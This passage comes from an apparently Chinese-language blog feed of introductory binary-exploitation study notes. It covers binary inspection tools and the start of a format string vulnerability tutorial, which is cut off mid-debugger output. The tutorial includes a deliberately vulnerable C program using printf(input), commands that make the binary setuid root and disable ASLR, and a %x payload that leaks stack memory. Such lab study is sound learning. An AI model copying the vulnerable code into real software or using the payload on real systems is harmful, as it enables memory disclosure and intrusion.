&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132915670.png&#34; alt=&#34;image-20230222132915670&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;nm&#34;&gt;&lt;a href=&#34;#nm&#34; class=&#34;headerlink&#34; title=&#34;nm&#34;&gt;&lt;/a&gt;nm&lt;/h1&gt;&lt;p&gt;打印可执行程序的符号信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132921275.png&#34; alt=&#34;image-20230222132921275&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;strings&#34;&gt;&lt;a href=&#34;#strings&#34; class=&#34;headerlink&#34; title=&#34;strings&#34;&gt;&lt;/a&gt;strings&lt;/h1&gt;&lt;p&gt;查看可打印字符串信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132932791.png&#34; alt=&#34;image-20230222132932791&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;objdump-1&#34;&gt;&lt;a href=&#34;#objdump-1&#34; class=&#34;headerlink&#34; title=&#34;objdump&#34;&gt;&lt;/a&gt;objdump&lt;/h1&gt;&lt;p&gt;打印可执行程序的信息&lt;/p&gt;
&lt;p&gt;-h 打印section头信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132942474.png&#34; alt=&#34;image-20230222132942474&#34;&gt;&lt;/p&gt;
&lt;p&gt;-d 打印可执行section汇编&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-6-%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/image-20230222132950821.png&#34; alt=&#34;image-20230222132950821&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;readelf&#34;&gt;&lt;a href=&#34;#readelf&#34; class=&#34;headerlink&#34; title=&#34;readelf&#34;&gt;&lt;/a&gt;readelf&lt;/h1&gt;&lt;p&gt;查看data段&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-01-24T10:13:28.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
        <title>pwn入门-5-格式化字符串漏洞</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
        <content type="html">&lt;h2 id=&#34;备忘&#34;&gt;&lt;a href=&#34;#备忘&#34; class=&#34;headerlink&#34; title=&#34;备忘&#34;&gt;&lt;/a&gt;备忘&lt;/h2&gt;&lt;p&gt;1.看一下其他资料、书、博客、datacon的视频等&lt;/p&gt;
&lt;p&gt;2.刷题&lt;/p&gt;
&lt;p&gt;主要是对《计算机安全导论-深度实践》 里面格式化字符串一章节的学习和复现&lt;/p&gt;
&lt;h1 id=&#34;基础&#34;&gt;&lt;a href=&#34;#基础&#34; class=&#34;headerlink&#34; title=&#34;基础&#34;&gt;&lt;/a&gt;基础&lt;/h1&gt;&lt;p&gt;printf等输出函数为什么可以接收任意数量的参数?  就是这么设计的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20230217103340659.png&#34; alt=&#34;image-20230217103340659&#34;&gt;&lt;/p&gt;
&lt;p&gt;va_list是什么? 如何移动?&lt;/p&gt;
&lt;p&gt;参见《计算机安全导论 深度实践》107页&lt;/p&gt;
&lt;h1 id=&#34;漏洞程序与利用&#34;&gt;&lt;a href=&#34;#漏洞程序与利用&#34; class=&#34;headerlink&#34; title=&#34;漏洞程序与利用&#34;&gt;&lt;/a&gt;漏洞程序与利用&lt;/h1&gt;&lt;p&gt;漏洞程序&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fmtstr&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; input[&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; var = &lt;span class=&#34;number&#34;&gt;0x11223344&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;//输出一些后面要用到的数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;target address %x\n&amp;quot;&lt;/span&gt;,(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt;) &amp;amp;var);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;data at target address:0x%x\n&amp;quot;&lt;/span&gt;,var);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;please enter a string:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fgets(input, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(input)&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;stdin&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(input); &lt;span class=&#34;comment&#34;&gt;//漏洞点在这里&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;data at target address: 0x%x\n&amp;quot;&lt;/span&gt;,var);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	fmtstr();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;gcc -m32 -o vul vul.c 编译32位的&lt;/p&gt;
&lt;p&gt;去除保护需要吗?  -fno-stack-protector                gcc -m32  -fno-stack-protector -o vul vul.c  &lt;/p&gt;
&lt;p&gt;sudo chown root vul&lt;/p&gt;
&lt;p&gt;sudo chmod 4755 vul&lt;/p&gt;
&lt;p&gt;sudo sysctl -w kernel.randomize_va_space&amp;#x3D;0 关闭地址随机化保护&lt;/p&gt;
&lt;h2 id=&#34;认识程序栈&#34;&gt;&lt;a href=&#34;#认识程序栈&#34; class=&#34;headerlink&#34; title=&#34;认识程序栈&#34;&gt;&lt;/a&gt;认识程序栈&lt;/h2&gt;&lt;p&gt;了解程序在栈中的布局非常重要&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20230217104556343.png&#34; alt=&#34;image-20230217104556343&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;输出栈中的数据&#34;&gt;&lt;a href=&#34;#输出栈中的数据&#34; class=&#34;headerlink&#34; title=&#34;输出栈中的数据&#34;&gt;&lt;/a&gt;输出栈中的数据&lt;/h2&gt;&lt;p&gt;%x.%x.%x.%x.%x.%x.%x.%x.%x.&lt;/p&gt;
&lt;p&gt;63.f7fbd5c0.565555d9.ffffd5aa.11223344.252e7825.78252e78.2e78252e.252e7825.&lt;/p&gt;
&lt;p&gt;为什么是%x呢? 别的呢? 看基础里面的图,这个是printf的输出格式 ,&lt;/p&gt;
&lt;p&gt;这个顺序是什么顺序呢?从哪里开始呢? 为什么不是格式化字符串地址挨着变量呢?&lt;/p&gt;
&lt;p&gt;刚输入进去的时候是挨着的呀,哦吼,这是从esp下面第一个开始往下打印,&lt;font color=&#34;red&#34;&gt;所以这里的栈桢结构和上面的图是反着的!!&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│ esp &lt;span class=&#34;number&#34;&gt;0xffffd510&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xffffd52c&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0004&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd514&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x63&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;c&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;02&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd518&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xf7fbd5c0&lt;/span&gt; (_IO_2_1_stdin_) ◂— &lt;span class=&#34;number&#34;&gt;0xfbad2288&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;000&lt;/span&gt;c│     &lt;span class=&#34;number&#34;&gt;0xffffd51c&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x56555579&lt;/span&gt; (fmtstr+&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;) ◂— add    ebx, &lt;span class=&#34;number&#34;&gt;0x1a57&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd520&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xffffd55a&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0xf4000100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0014&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd524&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xf7ffc984&lt;/span&gt; (_rtld_global_ro+&lt;span class=&#34;number&#34;&gt;132&lt;/span&gt;) ◂— &lt;span class=&#34;number&#34;&gt;0x6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;│     &lt;span class=&#34;number&#34;&gt;0xffffd528&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x11223344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;07&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;001&lt;/span&gt;c│     &lt;span class=&#34;number&#34;&gt;0xffffd52c&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;%x.%x.%x.%x.%x.%x.%x.%x.%x.\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0020&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0xffffd530&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;x.%x.%x.%x.%x.%x.%x.%x.\n&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;在gdb中,直接r,然后输入%x.%x.%x.%x.%x.%x.%x.%x.%x., 就直接运行结束了,没办法看到调试后的效果,这也是自己刚开始很久都不会的调试方法…这种问题应该和同学交流的,搜索引擎也不容易搜到.&lt;/p&gt;
&lt;p&gt;pwndbg&amp;gt; r&lt;br&gt;Starting program: &amp;#x2F;home&amp;#x2F;ubuntu&amp;#x2F;cssec&amp;#x2F;strings&amp;#x2F;vul&lt;br&gt;target address ffffd524&lt;br&gt;data at target address:0x11223344&lt;br&gt;please enter a string:%x.%x.%x.%x.%x.%x.%x.%x.%x.&lt;br&gt;63.f7fbd5c0.565555d9.ffffd55a.11223344.252e7825.78252e78.2e78252e.252e7825.&lt;br&gt;data at target address: 0x11223344&lt;br&gt;[Inferior 1 (process 28953) exited normally&lt;/p&gt;
&lt;p&gt;在它之后下断点就可以了吧 &lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x5655563d&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;112&lt;/span&gt;&amp;gt;    lea    eax, [ebp - &lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x56555640&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;115&lt;/span&gt;&amp;gt;    push   eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ► &lt;span class=&#34;number&#34;&gt;0x56555641&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;116&lt;/span&gt;&amp;gt;    call   fgets@plt                    &amp;lt;fgets@plt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s: &lt;span class=&#34;number&#34;&gt;0xffffd528&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xf7ffc988&lt;/span&gt; (_rtld_global_ro+&lt;span class=&#34;number&#34;&gt;136&lt;/span&gt;) ◂— &lt;span class=&#34;number&#34;&gt;0x55&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;U&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        n: &lt;span class=&#34;number&#34;&gt;0x63&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        stream: &lt;span class=&#34;number&#34;&gt;0xf7fbd5c0&lt;/span&gt; (_IO_2_1_stdin_) ◂— &lt;span class=&#34;number&#34;&gt;0xfbad2088&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x56555646&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;121&lt;/span&gt;&amp;gt;    add    esp, &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x56555649&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;124&lt;/span&gt;&amp;gt;    sub    esp, &lt;span class=&#34;number&#34;&gt;0xc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x5655564c&lt;/span&gt; &amp;lt;fmtstr+&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;&amp;gt;    lea    eax, [ebp - &lt;span class=&#34;number&#34;&gt;0x7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                           &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                           &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;可以在这后面直接下断点即可 b *&lt;span class=&#34;number&#34;&gt;0x56555646&lt;/span&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                           &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在fgets输入后得到栈的布局如下                                     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; teles&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;│ esp     &lt;span class=&#34;number&#34;&gt;0xffffd510&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xffffd528&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaabbbbccccddddeeeeffff\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;01&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0004&lt;/span&gt;│         &lt;span class=&#34;number&#34;&gt;0xffffd514&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x63&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* &amp;#x27;c&amp;#x27; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;02&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0008&lt;/span&gt;│         &lt;span class=&#34;number&#34;&gt;0xffffd518&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xf7fbd5c0&lt;/span&gt; (_IO_2_1_stdin_) ◂— &lt;span class=&#34;number&#34;&gt;0xfbad2288&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;03&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;000&lt;/span&gt;c│         &lt;span class=&#34;number&#34;&gt;0xffffd51c&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0x565555d9&lt;/span&gt; (fmtstr+&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;) ◂— add    ebx, &lt;span class=&#34;number&#34;&gt;0x19f3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;04&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0010&lt;/span&gt;│         &lt;span class=&#34;number&#34;&gt;0xffffd520&lt;/span&gt; —▸ &lt;span class=&#34;number&#34;&gt;0xffffd55a&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x9d000100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;05&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0014&lt;/span&gt;│         &lt;span class=&#34;number&#34;&gt;0xffffd524&lt;/span&gt; ◂— &lt;span class=&#34;number&#34;&gt;0x11223344&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;06&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0018&lt;/span&gt;│ eax ecx &lt;span class=&#34;number&#34;&gt;0xffffd528&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaabbbbccccddddeeeeffff\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;07&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;001&lt;/span&gt;c│         &lt;span class=&#34;number&#34;&gt;0xffffd52c&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;bbbbccccddddeeeeffff\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;08&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0020&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0xffffd530&lt;/span&gt; ◂— &lt;span class=&#34;string&#34;&gt;&amp;#x27;ccccddddeeeeffff\n&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;09&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;0024&lt;/span&gt;│  &lt;span class=&#34;number&#34;&gt;0xffffd534&lt;/span&gt; ◂— &lt;span 